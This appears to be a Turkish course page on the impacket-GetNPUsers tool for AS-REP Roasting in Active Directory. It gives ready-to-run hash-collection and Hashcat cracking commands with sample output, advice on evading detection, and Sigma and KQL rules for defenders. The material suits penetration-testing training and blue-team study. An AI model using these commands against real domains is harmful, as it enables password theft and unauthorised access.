# impacket-GetNPUsers

> **Kategori:** [6. Kerberos Protokol Cephaneliği](./README.md) · **Modül:** [Modül 11 — Araç Cephaneliği](../README.md)
> **Tanım:** Active Directory ortamında Kerberos ön kimlik doğrulama (Pre-Authentication) zorunluluğu kaldırılmış (`DONT_REQ_PREAUTH`) kullanıcı hesaplarını LDAP veya harici kullanıcı listeleri üzerinden tespit eden, bu hesaplar için parola girmeksizin KDC'den AS-REP yanıtı talep eden ve dönen şifrelenmiş paketleri Hashcat/John the Ripper formatında dışa aktaran AS-REP Roasting aracı.

---

## 1. Genel Bakış ve Amaç

Standart Kerberos kimlik doğrulama sürecinde istemci, Kerberos Dağıtım Merkezi'ne (KDC) bir `KRB_AS_REQ` paketi gönderdiğinde, ön kimlik doğrulama (Pre-Authentication - `PA-ENC-TIMESTAMP`) sağlamak zorundadır. Bu adımda istemci, kendi parolasından türetilen anahtar ile geçerli sistem saatini şifreleyerek KDC'ye sunar. KDC bu zaman damgasını çözebilirse kullanıcının parolayı bildiğini doğrular ve ancak bundan sonra TGT bileti içeren `KRB_AS_REP` paketini döndürür. Bu güvenlik önlemi, rastgele kişilerin başkaları adına bilet talep ederek çevrimdışı parola kırma saldırısı yapmasını engeller.

Ancak bazı eski işletim sistemleri, Unix/Linux istemcileri, çağrı merkezi uygulamaları veya uyumluluk senaryoları nedeniyle hesaplarda `Do not require Kerberos preauthentication` (UAC bayrağı: `DONT_REQ_PREAUTH` - `0x00400000`) özelliği aktif edilir. Bu özellik açık olduğunda, saldırgan herhangi bir parola veya şifreli zaman damgası göndermeksizin doğrudan hedef kullanıcı adına `AS-REQ` isteği atabilir. KDC sorgusuz sualsiz kurban kullanıcının parolasıyla şifrelenmiş bir `AS-REP` yanıtı döndürür. **`impacket-GetNPUsers`**, bu tasarım boşluğunu istismar ederek parola bilmeksizin (ve hatta ağda hiçbir kullanıcı hesabı olmadan yalnızca kullanıcı adları listesiyle) etki alanından şifreli parola hash'leri toplayan en etkili başlangıç erişim araçlarından biridir.

### Mimari Akış Şeması

```
[ Saldırgan (Linux / Harici Ağ veya İç Ağ) ]
       │
       │ (1) KRB_AS_REQ (Port 88 - KDC)
       │     "Ben kurban 'jdoe' kullanıcısıyım, bana TGT ver!"
       │     (Ön kimlik doğrulama / Parola şifreleme YOK)
       ▼
[ KDC (Domain Controller:88) ]
       │
       ├── Kullanıcı Kontrolü: 'jdoe' UAC'de DONT_REQ_PREAUTH açık mı?
       │     └── EVET! Parola doğrulaması gerekmez.
       ▼
[ KDC Yanıtı: KRB_AS_REP ]
       │
       │ (2) AS-REP Paketi Döner
       │     enc-part: 'jdoe' kullanıcısının NTLM/AES anahtarıyla şifreli
       ▼
[ impacket-GetNPUsers ]
       │
       │ (3) Şifreli Paket Ayrıştırılır ve Formatlanır
       ▼
[ Çıktı: $krb5asrep$23$jdoe@corp.local:... (Hashcat Mod 18200) ]
       │
       ▼
[ Çevrimdışı Parola Kırma: hashcat -m 18200 rockyou.txt ]
```

### Neden Önemli?

| Yetenek / Özellik | Açıklama | Operasyonel Değeri |
|---|---|---|
| **Kimlik Bilgisi Olmadan Çalışma** | Ağda hiçbir etki alanı parolası yokken salt kullanıcı listesi (`-usersfile`) ile çalışır. | Dış ağdan veya misafir ağından geçerli bir etki alanı parolasını ele geçirme imkanı sağlar. |
| **Sıfır Hesap Kilitleme Riski** | KDC'ye hiçbir parola denemesi gönderilmez; yalnızca bilet talep edilir. | `BadPwdCount` sayacını artırmaz, hesap kilitleme (Account Lockout) politikasını asla tetiklemez. |
| **Otomatik LDAP Keşfi** | Geçerli bir hesap varsa, tüm etki alanındaki savunmasız hesapları tek komutla otomatik bulur. | Zaman kaybetmeden etki alanındaki en zayıf halkaları ortaya çıkarır. |
| **Doğrudan Hashcat Formatı** | Çıktıları doğrudan Hashcat Mod 18200 (`$krb5asrep$23$`) formatında kaydeder. | Dönüştürücü betiklere ihtiyaç duymadan GPU tabanlı kırma kümesine iletilir. |

### Karşılaştırma Tablosu

| Kriter | impacket-GetNPUsers | Rubeus (asreproast) | Kerbrute (userenum) |
|---|---|---|---|
| **Platform** | Linux / Python | Windows (.NET / C#) | Bağımsız İkili (Go) |
| **Kimliksiz Çalışma** | Evet (`-usersfile -no-pass`) | Kısmi (CMD argümanı ile) | Evet (User Enumeration) |
| **LDAP Filtreleme** | Otomatik (Etki alanı hesabıyla) | Otomatik | Yok (Yalnızca wordlist) |
| **Çıktı Formatı** | Hashcat (18200) & John | Hashcat & John | Yalnızca kullanıcı var/yok |
| **Kullanım Yeri** | Dış Ağ Keşfi / Pivot | İç Ağ (Host Belleği) | Dış Ağ / Hızlı Kullanıcı Avı |

---

## 2. Temel Sözdizimi ve Parametreler (CLI Flags)

```bash
# 1. Otantikasyonlu Mod (LDAP üzerinden otomatik tarama):
impacket-GetNPUsers <ETKI_ALANI>/<KULLANICI>:<PAROLA> [SEÇENEKLER]

# 2. Otantike Olmadan Mod (Sadece kullanıcı listesi ile):
impacket-GetNPUsers -no-pass -usersfile <KULLANICI_DOSYASI> <ETKI_ALANI>/ [SEÇENEKLER]
```

### Kritik Parametre Tablosu

| Parametre | Açıklama | Örnek Değer |
|---|---|---|
| `-request` | Savunmasız hesaplar için KDC'den AS-REP biletlerini talep eder ve hash'leri döker. | Bayrak |
| `-usersfile <dosya>` | Ön kimlik doğrulama durumu kontrol edilecek kullanıcı adlarının bulunduğu metin dosyası. | `-usersfile usernames.txt` |
| `-outputfile <dosya>` | Elde edilen AS-REP hash'lerinin kaydedileceği hedef dosya. | `-outputfile asrep_hashes.txt`|
| `-format <ad>` | Çıktı hash formatı: `hashcat` (Varsayılan) veya `john`. | `-format hashcat` |
| `-dc-ip <ip>` | Bağlanılacak Domain Controller IP adresi. | `-dc-ip 192.168.1.10` |
| `-target-domain <ad>` | Sorgulanacak farklı bir etki alanı adı. | `-target-domain child.corp.local`|
| `-k` | Kerberos kimlik doğrulaması (`KRB5CCNAME` önbelleği) kullanır. | Bayrak |
| `-no-pass` | Parola sorulmasını engeller (Kullanıcı listesi ile saldırılarda zorunludur). | Bayrak |
| `-hashes [LM:]NTLM` | Parola yerine NTLM hash ile LDAP sorgusu yapar. | `-hashes :01fc5a...` |
| `-aesKey <hex>` | Parola yerine Kerberos AES anahtarı kullanır. | `-aesKey 1673...` |
| `-use-ldaps` | Düz metin LDAP (port 389) yerine SSL/TLS üzerinden LDAPS (port 636) kullanır. | Bayrak |

---

## 3. Pratik Komut Örnekleri

### Senaryo 1: Parolasız ve Kimliksiz Dış Ağdan Kullanıcı Listesi ile AS-REP Roasting

Şirket çalışanı e-postalarından veya OSINT ile elde edilmiş kullanıcı adları (`users.txt`) kullanılarak, hiçbir parolaya sahip olmadan doğrudan KDC'den AS-REP biletleri talep edilir.

```bash
impacket-GetNPUsers -no-pass -usersfile users.txt -dc-ip 192.168.1.10 corp.local/ -format hashcat -outputfile /tmp/asrep_loot.txt
```

**Konsol Çıktısı Analizi:**

```text
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Querying 192.168.1.10 for AS-REP...
[-] User administrator doesn't have UAC_DONT_REQUIRE_PREAUTH set
[-] User jdoe doesn't have UAC_DONT_REQUIRE_PREAUTH set
[+] User svc_scanner doesn't require preauthentication!
[*] Output file written to /tmp/asrep_loot.txt
```

**Oluşan Hash Formatı (`/tmp/asrep_loot.txt`):**

```text
$krb5asrep$23$svc_scanner@corp.local:9a8b7c6d5e4f3a2b1c0d...$e1a2b3c4...
```

---

### Senaryo 2: Etki Alanı Hesabıyla LDAP Üzerinden Otomatik Tarama ve Bilet Toplama

Düşük yetkili bir etki alanı hesabı (`lowpriv`) ile LDAP veritabanı taranır, `DONT_REQ_PREAUTH` açık tüm kullanıcılar otomatik bulunur ve anında biletleri indirilir.

```bash
impacket-GetNPUsers corp.local/lowpriv:'Password123!' \
  -dc-ip 192.168.1.10 \
  -request \
  -outputfile /tmp/all_asrep.txt
```

**Konsol Çıktısı Analizi:**

```text
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Getting TGT for lowpriv
[*] Extracting users with UAC_DONT_REQUIRE_PREAUTH set
[*] Found candidate: svc_printer
[*] Requesting AS-REP for svc_printer...
[*] Got AS-REP for svc_printer!
[*] Found candidate: test_legacy
[*] Requesting AS-REP for test_legacy...
[*] Got AS-REP for test_legacy!
[*] Saving hashes to /tmp/all_asrep.txt
[+] Successfully extracted 2 AS-REP hashes!
```

---

### Senaryo 3: Yalnızca Savunmasız Kullanıcıları Listeleme (Bilet Talep Etmeden)

`-request` parametresi verilmediğinde bilet talep edilmez; sadece LDAP taranarak zafiyet taşıyan hesaplar ekrana basılır. Bu sayede KDC logu üretilmez.

```bash
impacket-GetNPUsers corp.local/lowpriv:'Password123!' -dc-ip 192.168.1.10
```

---

### Senaryo 4: Hashcat ile Çevrimdışı Kırma (Mod 18200)

Toplanan AS-REP hash'leri Hashcat ile kırılır. AS-REP paketleri RC4 şifrelemeli olduğunda kırma işlemi son derece hızlı gerçekleşir.

```bash
hashcat -m 18200 -a 0 /tmp/all_asrep.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule -O
```

**Hashcat Kırma Çıktısı:**

```text
$krb5asrep$23$svc_scanner@corp.local:...:Summer2025!

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5 AS-REP etype 23)
Hash.Target......: /tmp/all_asrep.txt
Time.Started.....: Mon Apr 14 16:20:11 2026
Speed.#1.........: 1250.4 MH/s
Recovered........: 1/1 (100.00%) Digests
```

---

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata Mesajı / Belirti | Kök Neden | Kesin Çözüm Adımı |
|---|---|---|
| `User doesn't have UAC_DONT_REQUIRE_PREAUTH set` | Kurban hesapta ön kimlik doğrulama zorunludur (`DONT_REQ_PREAUTH` kapalı). | Bu hesap AS-REP Roasting için uygun değildir; Kerberoasting (`GetUserSPNs`) veya parola püskürtme deneyin. |
| `KDC_ERR_C_PRINCIPAL_UNKNOWN (6)` | Belirtilen kullanıcı adı Active Directory'de mevcut değil. | Kullanıcı adını doğrulayın; `-usersfile` listesindeki isimleri gözden geçirin. |
| `Kerberos SessionError: KRB_AP_ERR_SKEW (37)` | Saldırgan makinesi ile Domain Controller arasındaki saat farkı 5 dakikadan fazladır. | `sudo rdate -n <DC_IP>` veya `sudo ntpdate <DC_IP>` ile yerel sistem saatini DC ile eşitleyin. |
| `LDAPSessionError: strongAuthRequired (8)` | DC düz metin LDAP bağlantısını reddediyor. | Komuta `-use-ldaps` parametresi ekleyerek port 636 üzerinden güvenli bağlanın. |
| `Connection refused on port 88` | KDC (Kerberos) servisine erişim güvenlik duvarı tarafından engelleniyor. | Ağ erişimini kontrol edin, DC IP adresini doğrulayın veya tünelleme/proxychains kullanın. |
| `No users returned with UAC_DONT_REQUIRE_PREAUTH set` | Etki alanında bu zafiyeti taşıyan hiçbir hesap yapılandırılmamış. | Ortamda DONT_REQ_PREAUTH bulunmamaktadır; Kerberoasting veya ACL analizine geçin. |

---

## 5. OPSEC ve Karşı Tespit (IOC)

```
        GÜRÜLTÜ SEVİYESİ: DÜŞÜK-ORTA (KDC EVENT 4768)
──────────────────────────────────────────────────────────────────
[ Windows Logları ] : Event ID 4768 (TGT Request - PreAuth Type 0)
[ Ağ İmzası ]       : LDAP filtresi (userAccountControl:1.2.840.113556.1.4.803:=4194304)
[ Kilitlenme Riski] : SIFIR (Parola denemesi yapılmaz, kilitlenme sayacı artmaz)
[ EDR / AV ]        : Host tarafında sıfır iz (Ağ üzerinden saf Kerberos AS-REQ)
```

### 5.1 Bırakılan İzler (Artifacts & Event Logs)

1. **Windows Security Event ID 4768 (A Kerberos authentication ticket (TGT) was requested):**
   - **Pre-Authentication Type:** `0` veya `none` (Meşru kimlik doğrulamalarında bu değer `2` - `PA-ENC-TIMESTAMP` veya `15` / `16` - `PA-PK-AS-REQ` olmalıdır).
   - **Ticket Options:** Bilet istek seçeneklerinde `0x40810010` veya `0x40800010` görülür.
   - **Başarılı Durum:** `Result Code: 0x0` döner (KDC bileti sorunsuz üretmiştir).
2. **Directory Service Access Event ID 1644 / 4662:**
   - LDAP üzerinden `userAccountControl` bitmask sorgusu atıldığında DC olay kayıtlarına yansır.

### 5.2 Ağ ve EDR İmzaları

- **LDAP Bitmask Filtresi:** `(userAccountControl:1.2.840.113556.1.4.803:=4194304)` sorgusu Impacket tarafından kullanılan standart imzadır.
- **Toplu AS-REQ Paketleri:** Harici bir listeden binlerce kullanıcı için ardışık AS-REQ gönderilmesi ağ anomalisi olarak tespit edilebilir.

### 5.3 MITRE ATT&CK Eşleştirmesi

| Teknik ID | Teknik Adı | Araçtaki Karşılığı |
|---|---|---|
| **T1558.004** | Steal or Forge Kerberos Tickets: AS-REP Roasting | Ön kimlik doğrulamasız hesapların biletlerini toplayıp parola kırma. |
| **T1087.002** | Account Discovery: Domain Account | LDAP sorgusuyla DONT_REQ_PREAUTH hesapları tespit etme. |

### 5.4 OPSEC Risk ve Önlem Tablosu

| Tespit Riski | Önlem ve Operasyonel Tavsiye |
|---|---|
| **Toplu Kullanıcı Denemeleri** | `-usersfile` içine binlerce isim koymak yerine önceden doğrulanmış hedefleri deneyin. |
| **Pre-Auth Type 0 Alarmı** | Bu log KDC'de kaçınılmazdır. Mümkün olduğunca bilet talebini mesai saatleri içine yayın. |
| **Ağ İçi LDAP Gözetimi** | Düz LDAP yerine TLS şifreli LDAPS (`-use-ldaps`) kullanın. |

### 5.5 Savunma Karşılığı (Blue Team / KQL & Sigma)

**Sigma Kuralı — AS-REP Roasting Saldırısı Tespiti (PreAuth Type 0):**

```yaml
title: Potential AS-REP Roasting Attack
status: experimental
description: Detects Kerberos TGT requests without pre-authentication (PreAuthType 0), typical for AS-REP Roasting.
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4768
    PreAuthType: '0'
    Status: '0x0'
  filter:
    TargetUserName|endswith: '$'
  condition: selection and not filter
level: high
```

**Microsoft Sentinel (KQL) — Şüpheli AS-REP Roasting Tespiti:**

```kql
SecurityEvent
| where EventID == 4768
| where PreAuthType == 0 and Status == "0x0"
| where TargetUserName !endswith "$"
| project TimeGenerated, TargetUserName, IpAddress, TicketOptions, TicketEncryptionType
```

---

## 6. En Çok Kullanılan Komutlar ve Açıklamaları (Cheat Sheet)

### Komut 1: Kimliksiz Kullanıcı Listesi İle AS-REP Roasting
```bash
impacket-GetNPUsers -no-pass -usersfile users.txt -dc-ip 192.168.1.10 corp.local/ -outputfile /tmp/asrep.txt
```
- **Ne Yapar?** Hiçbir parola bilmeden, verilen listedeki kullanıcılar adına KDC'ye AS-REQ atar ve savunmasız olanların bilet hash'lerini kaydeder.
- **Ne Zaman Kullanılır?** İlk erişim aşamasında dış ağdan veya misafir ağından geçerli bir kullanıcı parolası ele geçirmek için.
- **Parametreler:** `-no-pass`: Parola sorma, `-usersfile`: Kullanıcı listesi, `-outputfile`: Kayıt dosyası.

### Komut 2: Etki Alanı Hesabıyla Otomatik Tarama ve Hash Toplama
```bash
impacket-GetNPUsers corp.local/jdoe:'Welcome123!' -dc-ip 192.168.1.10 -request -outputfile /tmp/all_asrep.txt
```
- **Ne Yapar?** LDAP üzerinden `DONT_REQ_PREAUTH` açık tüm hesapları otomatik tespit eder ve anında bilet hash'lerini indirir.
- **Ne Zaman Kullanılır?** İç ağda düşük yetkili bir kullanıcı elde edildiğinde etki alanındaki zayıf hesapları toplamak için.
- **Parametreler:** `-request`: Bilet talep bayrağı, `-outputfile`: Çıktı dosyası yolu.

### Komut 3: Yalnızca Savunmasız Hesapları Listeleme (Pasif Keşif)
```bash
impacket-GetNPUsers corp.local/jdoe:'Welcome123!' -dc-ip 192.168.1.10
```
- **Ne Yapar?** KDC'ye hiçbir bilet talebi göndermez; sadece LDAP üzerinden zafiyet taşıyan hesapları listeler.
- **Ne Zaman Kullanılır?** KDC üzerinde Event ID 4768 logu üretmeden pasif analiz yapmak için.
- **Parametreler:** Parametresiz (salt kimlik bilgisiyle).

### Komut 4: NTLM Hash ile (Pass-the-Hash) AS-REP Roasting
```bash
impacket-GetNPUsers corp.local/jdoe -hashes :01fc5a6be7bc6929c40372d23f5052b3 -dc-ip 192.168.1.10 -request -outputfile /tmp/hashes.txt
```
- **Ne Yapar?** Düz metin parola yerine NTLM hash kullanarak LDAP'ı tarar ve biletleri çeker.
- **Ne Zaman Kullanılır?** Parola bilinmediğinde ancak yerel kovanlardan NTLM hash ele geçirildiğinde.
- **Parametreler:** `-hashes`: NTLM karma değeri.

### Komut 5: John the Ripper Formatında Çıktı Alma
```bash
impacket-GetNPUsers corp.local/jdoe:'Welcome123!' -dc-ip 192.168.1.10 -request -format john -outputfile /tmp/asrep.john
```
- **Ne Yapar?** Bilet hash'lerini Hashcat yerine John the Ripper (`krb5asrep`) sözdizimine uygun kaydeder.
- **Ne Zaman Kullanılır?** Parola kırma aracı olarak John the Ripper tercih edildiğinde.
- **Parametreler:** `-format john`: Çıktı biçimi.

### Komut 6: Güvenli LDAPS Portu (636) Üzerinden Tarama
```bash
impacket-GetNPUsers corp.local/jdoe:'Welcome123!' -dc-ip 192.168.1.10 -use-ldaps -request
```
- **Ne Yapar?** LDAP sorgularını TLS şifreli port 636 üzerinden göndererek ağ içi IDS/IPS denetimlerini engeller.
- **Ne Zaman Kullanılır?** Ağ güvenliği gözetimi sıkı olan veya DC'de LDAP imzalama zorunlu kılınan ortamlarda.
- **Parametreler:** `-use-ldaps`: Güvenli soket bayrağı.

### Komut 7: Kerberos Bilet Önbelleği (.ccache) ile Çalıştırma
```bash
export KRB5CCNAME=/tmp/ticket.ccache
impacket-GetNPUsers corp.local/jdoe -k -no-pass -dc-ip 192.168.1.10 -request
```
- **Ne Yapar?** Parola girmeksizin mevcut bir Kerberos TGT bileti ile LDAP sorgusu atar ve biletleri çeker.
- **Ne Zaman Kullanılır?** Pass-the-Ticket yapılmış Linux oturumlarında.
- **Parametreler:** `-k`: Kerberos önbellek doğrulaması.

### Komut 8: Farklı Bir Alt Etki Alanını (Child Domain) Hedefleme
```bash
impacket-GetNPUsers corp.local/jdoe:'Welcome123!' -dc-ip 192.168.1.10 -target-domain sub.corp.local -request
```
- **Ne Yapar?** Kök etki alanı kimlik bilgileriyle alt veya güven ilişkili etki alanındaki hesapları tarar.
- **Ne Zaman Kullanılır?** Çoklu etki alanı (Forest/Trust) ortamlarında yanal hareket yaparken.
- **Parametreler:** `-target-domain`: Hedef etki alanı adı.

---

## Kaynaklar

- **Resmi GitHub Reposu:** [Fortra / Impacket](https://github.com/fortra/impacket)
- **MITRE ATT&CK Referansı:** [T1558.004 - AS-REP Roasting](https://attack.mitre.org/techniques/T1558/004/)
- **HarmJ0y Araştırması:** [Roasting AS-REPs](https://posts.specterops.io/roasting-as-reps-b803f61e6514)
- **Microsoft Dokümantasyonu:** [UserAccountControl Flags](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/useraccountcontrol-manipulate-account-properties)

---

> **Önceki:** [← impacket-GetUserSPNs](./impacket-GetUserSPNs.md) · **Sonraki:** [impacket-getTGT →](./impacket-getTGT.md)
